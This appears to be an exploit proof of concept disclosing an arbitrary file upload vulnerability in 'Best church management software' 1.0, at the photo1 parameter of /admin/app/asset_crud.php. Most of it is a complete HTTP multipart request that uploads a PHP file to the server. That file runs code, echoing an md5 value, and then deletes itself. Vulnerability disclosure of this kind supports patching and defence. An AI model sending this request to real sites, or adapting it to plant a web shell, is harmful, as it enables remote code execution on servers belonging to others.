### Exploit Title: Best church management software - Arbitrary File Upload
### Date: 2025-02/11
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/17856/best-church-management-software-free-download-full-version.html
### Version: 1.0
### Tested on: windows10 + phpstudy

# 1./admin/app/asset_crud.php Parameter photo1 has Arbitrary File Upload

### Arbitrary File Upload request POC #1

```
POST /admin/app/asset_crud.php HTTP/1.1
Host: 127.0.0.1:8001
Content-Length: 318
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarycwG0T0E49sibAByg
Cache-Control: no-cache
Accept: */*
Origin: chrome-extension://coohjcphdfgbiolnekdpbcijmhambjff
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundarycwG0T0E49sibAByg
Content-Disposition: form-data; name="submit"

1
------WebKitFormBoundarycwG0T0E49sibAByg
Content-Disposition: form-data; name="photo1"; filename="echomd51.php"
Content-Type: text/php

<?php echo md5(1);unlink(__FILE__); ?>
------WebKitFormBoundarycwG0T0E49sibAByg--

```
### Arbitrary File Upload
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739244088000.jpg "Best church management software")


